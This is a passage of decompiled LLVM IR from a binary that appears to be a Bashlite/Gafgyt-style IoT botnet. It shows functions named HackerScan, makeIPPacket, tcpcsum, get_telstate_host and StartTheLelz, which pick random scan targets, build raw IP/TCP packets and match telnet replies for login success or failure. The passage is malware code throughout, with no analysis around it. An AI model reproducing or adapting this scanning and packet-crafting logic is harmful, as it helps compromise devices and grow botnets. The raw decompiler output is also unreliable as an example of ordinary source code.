  store i32 %v0_804ca23, i32* @edi, align 4
  ret i32 %v1_804cba6

; uselistorder directives
  uselistorder i32 %v2_804caea, { 1, 0 }
  uselistorder i32 %v2_804caaa, { 1, 0 }
  uselistorder i32 %v2_804ca47, { 1, 0 }
  uselistorder i32* %stack_var_-36, { 1, 0 }
  uselistorder i8* @global_var_805e49a.30, { 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_805e499.29, { 211, 210, 209, 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* @global_var_805e498.28, { 2, 1, 0 }
  uselistorder i8* @global_var_805e497.27, { 3, 2, 1, 0 }
}

define i32 @HackerScan(i32 %arg1) local_unnamed_addr {
entry:
  %v0_804cbb9 = load i32, i32* @global_var_8064708.231, align 8
  %v1_804cbc1 = call i32 @ntohl(i32 %v0_804cbb9)
  %v5_804cbc6 = and i32 %v1_804cbc1, %arg1
  %v1_804cbcc = call i32 @rand_cmwc(i32 %v5_804cbc6)
  %v1_804cbd6 = sub i32 -1, %arg1
  %v2_804cbd8 = and i32 %v1_804cbcc, %v1_804cbd6
  %v5_804cbda = xor i32 %v2_804cbd8, %v5_804cbc6
  ret i32 %v5_804cbda
}

define i32 @csum(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_804cbe4 = load i32, i32* @ebx, align 4
  %v4_804cc1333 = add i32 %arg2, -1
  %v9_804cc1334 = sub i32 0, %arg2
  %v10_804cc1335 = and i32 %arg2, %v9_804cc1334
  %v11_804cc1336 = icmp slt i32 %v10_804cc1335, 0
  %v12_804cc1337 = icmp eq i32 %v4_804cc1333, 0
  %v13_804cc1338 = icmp slt i32 %v4_804cc1333, 0
  %v3_804cc1739 = icmp eq i1 %v13_804cc1338, %v11_804cc1336
  %v4_804cc1740 = icmp eq i1 %v12_804cc1337, false
  %v5_804cc1741 = and i1 %v4_804cc1740, %v3_804cc1739
  br i1 %v5_804cc1741, label %dec_label_pc_804cbf8, label %dec_label_pc_804cc19

dec_label_pc_804cbf8:                             ; preds = %entry, %dec_label_pc_804cbf8
  %stack_var_-24.045 = phi i16 [ %v9_804cc08, %dec_label_pc_804cbf8 ], [ 0, %entry ]
  %stack_var_8.044 = phi i32 [ %v4_804cc0f, %dec_label_pc_804cbf8 ], [ %arg2, %entry ]
  %stack_var_4.043 = phi i16* [ %v23_804cc0b, %dec_label_pc_804cbf8 ], [ %arg1, %entry ]
  %v3_804cc0542 = phi i32 [ %v6_804cc05, %dec_label_pc_804cbf8 ], [ 0, %entry ]
  %v4_804cbf8 = ptrtoint i16* %stack_var_4.043 to i32
  %v2_804cbfb = load i16, i16* %stack_var_4.043, align 2
  %v3_804cbfb = zext i16 %v2_804cbfb to i32
  %sext51 = mul i32 %v3_804cc0542, 65536
  %v4_804cc05 = sdiv i32 %sext51, 65536
  %v6_804cc05 = add nsw i32 %v3_804cbfb, %v4_804cc05
  %v11_804cc05 = icmp ult i32 %v6_804cc05, %v4_804cc05
  %v26_804cc05 = trunc i32 %v6_804cc05 to i16
  %v7_804cc08 = zext i1 %v11_804cc05 to i16
  %v9_804cc08 = add i16 %v7_804cc08, %stack_var_-24.045
  %v5_804cc0b = add i32 %v4_804cbf8, 2
  %v23_804cc0b = inttoptr i32 %v5_804cc0b to i16*
  %v4_804cc0f = add i32 %stack_var_8.044, -2
  %v4_804cc13 = add i32 %stack_var_8.044, -3
  %v9_804cc13 = sub i32 2, %stack_var_8.044
  %v10_804cc13 = and i32 %v4_804cc0f, %v9_804cc13
  %v11_804cc13 = icmp slt i32 %v10_804cc13, 0
  %v12_804cc13 = icmp eq i32 %v4_804cc13, 0
  %v13_804cc13 = icmp slt i32 %v4_804cc13, 0
  %v3_804cc17 = icmp eq i1 %v13_804cc13, %v11_804cc13
  %v4_804cc17 = icmp eq i1 %v12_804cc13, false
  %v5_804cc17 = and i1 %v4_804cc17, %v3_804cc17
  br i1 %v5_804cc17, label %dec_label_pc_804cbf8, label %dec_label_pc_804cc19

dec_label_pc_804cc19:                             ; preds = %dec_label_pc_804cbf8, %entry
  %v3_804cc05.lcssa = phi i16 [ 0, %entry ], [ %v26_804cc05, %dec_label_pc_804cbf8 ]
  %stack_var_4.0.lcssa = phi i16* [ %arg1, %entry ], [ %v23_804cc0b, %dec_label_pc_804cbf8 ]
  %stack_var_8.0.lcssa = phi i32 [ %arg2, %entry ], [ %v4_804cc0f, %dec_label_pc_804cbf8 ]
  %stack_var_-24.0.lcssa = phi i16 [ 0, %entry ], [ %v9_804cc08, %dec_label_pc_804cbf8 ]
  %tmp18 = icmp slt i32 %stack_var_8.0.lcssa, 1
  br i1 %tmp18, label %dec_label_pc_804cc5a.preheader, label %dec_label_pc_804cc1f

dec_label_pc_804cc1f:                             ; preds = %dec_label_pc_804cc19
  %v1_804cc22 = bitcast i16* %stack_var_4.0.lcssa to i8*
  %v2_804cc22 = load i8, i8* %v1_804cc22, align 1
  %v3_804cc22 = zext i8 %v2_804cc22 to i32
  %v4_804cc2d = sext i16 %v3_804cc05.lcssa to i32
  %v6_804cc2d = add nsw i32 %v3_804cc22, %v4_804cc2d
  %v11_804cc2d = icmp ult i32 %v6_804cc2d, %v4_804cc2d
  %v26_804cc2d = trunc i32 %v6_804cc2d to i16
  %v7_804cc30 = zext i1 %v11_804cc2d to i16
  %v9_804cc30 = add i16 %v7_804cc30, %stack_var_-24.0.lcssa
  br label %dec_label_pc_804cc5a.preheader

dec_label_pc_804cc5a.preheader:                   ; preds = %dec_label_pc_804cc1f, %dec_label_pc_804cc19
  %v3_804cc3f.ph = phi i16 [ %v3_804cc05.lcssa, %dec_label_pc_804cc19 ], [ %v26_804cc2d, %dec_label_pc_804cc1f ]
  %stack_var_-24.1.ph = phi i16 [ %stack_var_-24.0.lcssa, %dec_label_pc_804cc19 ], [ %v9_804cc30, %dec_label_pc_804cc1f ]
  %v4_804cc5a20 = sext i16 %v3_804cc3f.ph to i32
  %v4_804cc5d21 = sext i16 %stack_var_-24.1.ph to i32
  %v3_804cc6022 = udiv i32 %v4_804cc5a20, 65536
  %v4_804cc6023 = mul i32 %v4_804cc5d21, 65536
  %v5_804cc6024 = or i32 %v4_804cc6023, %v3_804cc6022
  %v2_804cc6425 = udiv i32 %v4_804cc5d21, 65536
  %v2_804cc6726 = or i32 %v5_804cc6024, %v2_804cc6425
  %v3_804cc6727 = icmp eq i32 %v2_804cc6726, 0
  %v1_804cc6b28 = icmp eq i1 %v3_804cc6727, false
  br i1 %v1_804cc6b28, label %dec_label_pc_804cc35, label %dec_label_pc_804cc6d

dec_label_pc_804cc35:                             ; preds = %dec_label_pc_804cc5a.preheader, %dec_label_pc_804cc35
  %v2_804cc6431 = phi i32 [ %v2_804cc64, %dec_label_pc_804cc35 ], [ %v2_804cc6425, %dec_label_pc_804cc5a.preheader ]
  %v5_804cc6030 = phi i32 [ %v5_804cc60, %dec_label_pc_804cc35 ], [ %v5_804cc6024, %dec_label_pc_804cc5a.preheader ]
  %v4_804cc5a29 = phi i32 [ %v4_804cc5a, %dec_label_pc_804cc35 ], [ %v4_804cc5a20, %dec_label_pc_804cc5a.preheader ]
  %v2_804cc50 = add i32 %v5_804cc6030, %v4_804cc5a29
  %v7_804cc50 = icmp ult i32 %v2_804cc50, %v4_804cc5a29
  %v3_804cc52 = zext i1 %v7_804cc50 to i32
  %v5_804cc52 = add nuw nsw i32 %v3_804cc52, %v2_804cc6431
  %sext = mul i32 %v2_804cc50, 65536
  %v4_804cc5a = sdiv i32 %sext, 65536
  %sext50 = mul i32 %v5_804cc52, 65536
  %v4_804cc5d = sdiv i32 %sext50, 65536
  %v3_804cc60 = udiv i32 %v4_804cc5a, 65536
  %v5_804cc60 = or i32 %sext50, %v3_804cc60
  %v2_804cc64 = udiv i32 %v4_804cc5d, 65536
  %v2_804cc67 = or i32 %v5_804cc60, %v2_804cc64
  %v3_804cc67 = icmp eq i32 %v2_804cc67, 0
  %v1_804cc6b = icmp eq i1 %v3_804cc67, false
  br i1 %v1_804cc6b, label %dec_label_pc_804cc35, label %dec_label_pc_804cc5a.dec_label_pc_804cc6d_crit_edge

dec_label_pc_804cc5a.dec_label_pc_804cc6d_crit_edge: ; preds = %dec_label_pc_804cc35
  br label %dec_label_pc_804cc6d

dec_label_pc_804cc6d:                             ; preds = %dec_label_pc_804cc5a.dec_label_pc_804cc6d_crit_edge, %dec_label_pc_804cc5a.preheader
  %v4_804cc5a.lcssa = phi i32 [ %v4_804cc5a, %dec_label_pc_804cc5a.dec_label_pc_804cc6d_crit_edge ], [ %v4_804cc5a20, %dec_label_pc_804cc5a.preheader ]
  %v1_804cc71 = urem i32 %v4_804cc5a.lcssa, 65536
  %v1_804cc73 = xor i32 %v1_804cc71, 65535
  store i32 %v0_804cbe4, i32* @ebx, align 4
  ret i32 %v1_804cc73

; uselistorder directives
  uselistorder i32 %v5_804cc60, { 1, 0 }
  uselistorder i32 %v4_804cc5a, { 1, 0, 2 }
  uselistorder i32 %v2_804cc6425, { 1, 0 }
  uselistorder i32 %v4_804cc5d21, { 1, 0 }
  uselistorder i32 %v4_804cc5a20, { 2, 1, 0 }
  uselistorder i32 %v4_804cc2d, { 1, 0 }
  uselistorder i16 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i16 %v3_804cc05.lcssa, { 1, 0 }
  uselistorder i32 %v4_804cc13, { 1, 0 }
  uselistorder i32 %v4_804cc0f, { 0, 2, 1 }
  uselistorder i32 %v6_804cc05, { 1, 2, 0 }
  uselistorder i32 %v4_804cc05, { 1, 0 }
  uselistorder label %dec_label_pc_804cc35, { 1, 0 }
  uselistorder label %dec_label_pc_804cbf8, { 1, 0 }
}

define i32 @tcpcsum() local_unnamed_addr {
entry:
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804cc7e = load i32, i32* @ebp, align 4
  store i32 %v0_804cc7e, i32* %stack_var_-4, align 4
  %v4_804cc7e = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804cc7e, i32* @ebp, align 4
  %v1_804cc92 = add i32 %tmp10, 12
  %v2_804cc92 = inttoptr i32 %v1_804cc92 to i32*
  %v3_804cc92 = load i32, i32* %v2_804cc92, align 4
  %v1_804cc9b = add i32 %tmp10, 16
  %v2_804cc9b = inttoptr i32 %v1_804cc9b to i32*
  %v3_804cc9b = load i32, i32* %v2_804cc9b, align 4
  %v2_804ccb0 = call i32 @htons(i16 20)
  %v1_804ccc9 = call i32 @malloc(i32 32)
  store i32 %v1_804ccc9, i32* %ecx.global-to-local, align 4
  %v2_804ccd9 = inttoptr i32 %v1_804ccc9 to i32*
  store i32 %v3_804cc92, i32* %v2_804ccd9, align 4
  %v1_804ccde = load i32, i32* %ecx.global-to-local, align 4
  %v2_804ccde = add i32 %v1_804ccde, 4
  %v3_804ccde = inttoptr i32 %v2_804ccde to i32*
  store i32 %v3_804cc9b, i32* %v3_804ccde, align 4
  %v1_804cce4 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804cce4 = add i32 %v1_804cce4, 8
  %v3_804cce4 = inttoptr i32 %v2_804cce4 to i32*
  store i32 0, i32* %v3_804cce4, align 4
  store i32 %tmp2, i32* %ecx.global-to-local, align 4
  %v1_804cced = add i32 %v1_804ccc9, 12
  store i32 %v1_804cced, i32* %edx.global-to-local, align 4
  %v1_804ccf0 = inttoptr i32 %tmp2 to i32*
  %v2_804ccf0 = load i32, i32* %v1_804ccf0, align 4
  %v2_804ccf2 = inttoptr i32 %v1_804cced to i32*
  store i32 %v2_804ccf0, i32* %v2_804ccf2, align 4
  %v0_804ccf4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ccf4 = add i32 %v0_804ccf4, 4
  %v2_804ccf4 = inttoptr i32 %v1_804ccf4 to i32*
  %v3_804ccf4 = load i32, i32* %v2_804ccf4, align 4
  %v1_804ccf7 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ccf7 = add i32 %v1_804ccf7, 4
  %v3_804ccf7 = inttoptr i32 %v2_804ccf7 to i32*
  store i32 %v3_804ccf4, i32* %v3_804ccf7, align 4
  %v0_804ccfa = load i32, i32* %ecx.global-to-local, align 4
  %v1_804ccfa = add i32 %v0_804ccfa, 8
  %v2_804ccfa = inttoptr i32 %v1_804ccfa to i32*
  %v3_804ccfa = load i32, i32* %v2_804ccfa, align 4
  %v1_804ccfd = load i32, i32* %edx.global-to-local, align 4
  %v2_804ccfd = add i32 %v1_804ccfd, 8
  %v3_804ccfd = inttoptr i32 %v2_804ccfd to i32*
  store i32 %v3_804ccfa, i32* %v3_804ccfd, align 4
  %v0_804cd00 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804cd00 = add i32 %v0_804cd00, 12
  %v2_804cd00 = inttoptr i32 %v1_804cd00 to i32*
  %v3_804cd00 = load i32, i32* %v2_804cd00, align 4
  %v1_804cd03 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cd03 = add i32 %v1_804cd03, 12
  %v3_804cd03 = inttoptr i32 %v2_804cd03 to i32*
  store i32 %v3_804cd00, i32* %v3_804cd03, align 4
  %v0_804cd06 = load i32, i32* %ecx.global-to-local, align 4
  %v1_804cd06 = add i32 %v0_804cd06, 16
  %v2_804cd06 = inttoptr i32 %v1_804cd06 to i32*
  %v3_804cd06 = load i32, i32* %v2_804cd06, align 4
  %v1_804cd09 = load i32, i32* %edx.global-to-local, align 4
  %v2_804cd09 = add i32 %v1_804cd09, 16
  %v3_804cd09 = inttoptr i32 %v2_804cd09 to i32*
  store i32 %v3_804cd06, i32* %v3_804cd09, align 4
  %v2_804cd19 = inttoptr i32 %v1_804ccc9 to i16*
  %v3_804cd19 = call i32 @csum(i16* %v2_804cd19, i32 32)
  %v1_804cd1e = urem i32 %v3_804cd19, 65536
  %v1_804cd2b = call i32 @free(i32 %v1_804ccc9)
  %v2_804cd34 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cd34, i32* @ebp, align 4
  ret i32 %v1_804cd1e

; uselistorder directives
  uselistorder i32 %v1_804ccc9, { 2, 1, 0, 3, 4 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %tmp10, { 1, 0 }
  uselistorder i32 %tmp2, { 1, 0 }
}

define i32 @makeIPPacket() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i8* @__decompiler_undefined_function_2()
  %tmp8 = call i8 @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_804cd36 = load i32, i32* @ebp, align 4
  store i32 %v0_804cd36, i32* %stack_var_-4, align 4
  %v4_804cd3c = sext i8 %tmp8 to i32
  %v4_804cd42 = ptrtoint i8* %tmp6 to i32
  store i8 69, i8* %tmp6, align 1
  %v1_804cd5d = add i32 %v4_804cd42, 1
  %v2_804cd5d = inttoptr i32 %v1_804cd5d to i8*
  store i8 0, i8* %v2_804cd5d, align 1
  %v1_804cd67 = add i32 %tmp5, 20
  %v1_804cd70 = trunc i32 %v1_804cd67 to i16
  %v3_804cd70 = add i32 %v4_804cd42, 2
  %v4_804cd70 = inttoptr i32 %v3_804cd70 to i16*
  store i16 %v1_804cd70, i16* %v4_804cd70, align 2
  %v2_804cd74 = call i32 @rand_cmwc(i32 %v4_804cd3c)
  %v1_804cd7f = trunc i32 %v2_804cd74 to i16
  %v3_804cd7f = add i32 %v4_804cd42, 4
  %v4_804cd7f = inttoptr i32 %v3_804cd7f to i16*
  store i16 %v1_804cd7f, i16* %v4_804cd7f, align 2
  %v1_804cd86 = add i32 %v4_804cd42, 6
  %v2_804cd86 = inttoptr i32 %v1_804cd86 to i16*
  store i16 0, i16* %v2_804cd86, align 2
  %v1_804cd8f = add i32 %v4_804cd42, 8
  %v2_804cd8f = inttoptr i32 %v1_804cd8f to i8*
  store i8 -1, i8* %v2_804cd8f, align 1
  %v3_804cd9a = add i32 %v4_804cd42, 9
  %v4_804cd9a = inttoptr i32 %v3_804cd9a to i8*
  store i8 %tmp8, i8* %v4_804cd9a, align 1
  %v1_804cda0 = add i32 %v4_804cd42, 10
  %v2_804cda0 = inttoptr i32 %v1_804cda0 to i16*
  store i16 0, i16* %v2_804cda0, align 2
  %v2_804cdac = add i32 %v4_804cd42, 12
  %v3_804cdac = inttoptr i32 %v2_804cdac to i32*
  %v2_804cdb5 = add i32 %v4_804cd42, 16
  %v3_804cdb5 = inttoptr i32 %v2_804cdb5 to i32*
  store i32 %tmp, i32* %v3_804cdb5, align 4
  %v2_804cdb8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cdb8, i32* @ebp, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i8 -1, { 3, 0, 2, 1 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_804cdba = load i32, i32* @ebp, align 4
  store i32 %v0_804cdba, i32* %stack_var_-4, align 4
  %v4_804cdc0 = add i32 %arg1, -2
  %v9_804cdc0 = sub i32 1, %arg1
  %v10_804cdc0 = and i32 %v9_804cdc0, %arg1
  %v11_804cdc0 = icmp slt i32 %v10_804cdc0, 0
  %v12_804cdc0 = icmp eq i32 %v4_804cdc0, 0
  %v13_804cdc0 = icmp slt i32 %v4_804cdc0, 0
  %v3_804cdc4 = icmp eq i1 %v13_804cdc0, %v11_804cdc0
  %v4_804cdc4 = icmp eq i1 %v12_804cdc0, false
  %v5_804cdc4 = and i1 %v4_804cdc4, %v3_804cdc4
  br i1 %v5_804cdc4, label %dec_label_pc_804cdcf, label %dec_label_pc_804cde1

dec_label_pc_804cdcf:                             ; preds = %entry
  %v1_804cdd5 = call i32 @__libc_close(i32 %arg1)
  %v2_804cde4.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804cde1

dec_label_pc_804cde1:                             ; preds = %entry, %dec_label_pc_804cdcf
  %v2_804cde4 = phi i32 [ %v2_804cde4.pre, %dec_label_pc_804cdcf ], [ %v0_804cdba, %entry ]
  %storemerge = phi i32 [ 0, %dec_label_pc_804cdcf ], [ 1, %entry ]
  store i32 %v2_804cde4, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804cdc0, { 1, 0 }
  uselistorder i32 %arg1, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_804cde1, { 1, 0 }
}

define i32 @get_telstate_host() local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v0_804cde6 = load i32, i32* @ebp, align 4
  %v1_804cdef = add i32 %tmp1, 4
  %v2_804cdef = inttoptr i32 %v1_804cdef to i32*
  %v3_804cdef = load i32, i32* %v2_804cdef, align 4
  %v1_804cdfb = call i32 @__GI_inet_ntoa(i32 %v3_804cdef)
  store i32 %v0_804cde6, i32* @ebp, align 4
  ret i32 %v1_804cdfb
}

define i32 @read_until_response(i32 %arg1) local_unnamed_addr {
entry:
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_804ce05 = load i32, i32* @edi, align 4
  store i32 %v0_804ce05, i32* %stack_var_-8, align 4
  %v1_804ce0f = inttoptr i32 %tmp8 to i8*
  store i32 %tmp8, i32* @edi, align 4
  %v1_804ce14 = and i32 %tmp8, -256
  %v5_804ce16 = call i8* @_memset(i8* %v1_804ce0f, i32 %v1_804ce14, i32 %tmp9)
  %v4_804ce33 = call i32 @read_with_timeout(i32 %arg1, i32 %tmp5, i32 %tmp8, i32 %tmp9)
  %v2_804ce48 = inttoptr i32 %tmp1 to i32*
  %v3_804ce48 = call i32 @contains_string(i32 %tmp8, i32* %v2_804ce48)
  %v1_804ce4d = icmp ne i32 %v3_804ce48, 0
  %storemerge = zext i1 %v1_804ce4d to i32
  %v2_804ce67 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ce67, i32* @edi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp9, { 1, 0 }
  uselistorder i32 %tmp8, { 4, 3, 0, 2, 1 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  store i32 0, i32* %stack_var_-152, align 4
  %v2_804ce91 = ptrtoint i32* %stack_var_-144 to i32
  %tmp18 = bitcast i32* %stack_var_-144 to i8*
  store i1 false, i1* @df, align 1
  %v5_804ce98 = call i8* @_memset(i8* %tmp18, i32 0, i32 32)
  %v2_804cea5 = udiv i32 %arg1, 32
  %v1_804ceab = urem i32 %arg1, 32
  %v0_804ceae = load i32, i32* @ebp, align 4
  %v2_804ceae = mul nuw nsw i32 %v2_804cea5, 4
  %v3_804ceae = add nsw i32 %v2_804ceae, -140
  %v4_804ceae = add i32 %v3_804ceae, %v0_804ceae
  %v5_804ceae = inttoptr i32 %v4_804ceae to i32*
  %v6_804ceae = load i32, i32* %v5_804ceae, align 4
  %v9_804ceae = shl i32 1, %v1_804ceab
  %v12_804ceae = or i32 %v6_804ceae, %v9_804ceae
  store i32 %v12_804ceae, i32* %v5_804ceae, align 4
  %v1_804ceb9 = add i32 %arg1, 1
  %v4_804cec0 = ptrtoint i32* %stack_var_-152 to i32
  %v5_804cee1 = call i32 @__libc_select(i32 %v1_804ceb9, i32 %v2_804ce91, i32 0, i32 0, i32 %v4_804cec0)
  %tmp19 = icmp slt i32 %v5_804cee1, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_804cef6, label %dec_label_pc_804cf1d

dec_label_pc_804cef6:                             ; preds = %entry
  %v4_804cf12 = call i32 @__libc_recv(i32 %arg1, i32 %arg3, i32 %arg4, i32 0)
  br label %dec_label_pc_804cf1d

dec_label_pc_804cf1d:                             ; preds = %entry, %dec_label_pc_804cef6
  %storemerge = phi i32 [ %v4_804cf12, %dec_label_pc_804cef6 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-152, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804cf1d, { 1, 0 }
}

define i32 @contains_success() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804cf2c = load i32, i32* @ebp, align 4
  store i32 %v0_804cf2c, i32* %stack_var_-4, align 4
  %v4_804cf2c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804cf2c, i32* @ebp, align 4
  %v4_804cf40 = call i32 @contains_string(i32 %tmp, i32* bitcast ([3 x i8*]* @global_var_805e0a0.235 to i32*))
  %v2_804cf45 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cf45, i32* @ebp, align 4
  ret i32 %v4_804cf40

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_fail() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804cf47 = load i32, i32* @ebp, align 4
  store i32 %v0_804cf47, i32* %stack_var_-4, align 4
  %v4_804cf47 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_804cf47, i32* @ebp, align 4
  %v4_804cf5b = call i32 @contains_string(i32 %tmp, i32* bitcast ([7 x i8*]* @global_var_805e080.243 to i32*))
  %v2_804cf60 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cf60, i32* @ebp, align 4
  ret i32 %v4_804cf5b

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @contains_string(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804cf62 = load i32, i32* @ebp, align 4
  store i32 %v0_804cf62, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804cf7d

dec_label_pc_804cf7d:                             ; preds = %dec_label_pc_804cf7d, %entry
  %stack_var_-12.0 = phi i32 [ 0, %entry ], [ %v4_804cf7d, %dec_label_pc_804cf7d ]
  %v4_804cf7d = add i32 %stack_var_-12.0, 1
  %v2_804cf83 = mul i32 %v4_804cf7d, 4
  %v5_804cf86 = add i32 %v2_804cf83, %tmp5
  %v1_804cf89 = inttoptr i32 %v5_804cf86 to i32*
  %v2_804cf89 = load i32, i32* %v1_804cf89, align 4
  %v1_804cf8b = icmp eq i32 %v2_804cf89, 0
  %v1_804cf8d = icmp eq i1 %v1_804cf8b, false
  br i1 %v1_804cf8d, label %dec_label_pc_804cf7d, label %dec_label_pc_804cfc2.preheader

dec_label_pc_804cfc2.preheader:                   ; preds = %dec_label_pc_804cf7d
  %v2_804cfad = inttoptr i32 %arg1 to i8*
  %v5_804cfc817 = icmp sgt i32 %v4_804cf7d, 0
  br i1 %v5_804cfc817, label %dec_label_pc_804cf98, label %dec_label_pc_804cfd1

dec_label_pc_804cf98:                             ; preds = %dec_label_pc_804cfc2.preheader, %dec_label_pc_804cfbf
  %storemerge118 = phi i32 [ %v4_804cfbf, %dec_label_pc_804cfbf ], [ 0, %dec_label_pc_804cfc2.preheader ]
  %v2_804cf9b = mul i32 %storemerge118, 4
  %v5_804cf9e = add i32 %v2_804cf9b, %tmp5
  %v1_804cfa1 = inttoptr i32 %v5_804cf9e to i32*
  %v2_804cfa1 = load i32, i32* %v1_804cfa1, align 4
  store i32 %arg1, i32* @eax, align 4
  %v3_804cfad = call i32 @strcasestr(i8* %v2_804cfad, i32 %v2_804cfa1)
  %v1_804cfb2 = icmp eq i32 %v3_804cfad, 0
  br i1 %v1_804cfb2, label %dec_label_pc_804cfbf, label %dec_label_pc_804cfd1

dec_label_pc_804cfbf:                             ; preds = %dec_label_pc_804cf98
  %v4_804cfbf = add nuw nsw i32 %storemerge118, 1
  %v5_804cfc8 = icmp slt i32 %v4_804cfbf, %v4_804cf7d
  br i1 %v5_804cfc8, label %dec_label_pc_804cf98, label %dec_label_pc_804cfd1

dec_label_pc_804cfd1:                             ; preds = %dec_label_pc_804cf98, %dec_label_pc_804cfbf, %dec_label_pc_804cfc2.preheader
  %storemerge = phi i32 [ 0, %dec_label_pc_804cfc2.preheader ], [ 0, %dec_label_pc_804cfbf ], [ 1, %dec_label_pc_804cf98 ]
  %v2_804cfd4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804cfd4, i32* @ebp, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v4_804cfbf, { 1, 0 }
  uselistorder i32 %storemerge118, { 1, 0 }
  uselistorder i32 %v4_804cf7d, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_804cfd1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cf98, { 1, 0 }
}

define i32 @StartTheLelz(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
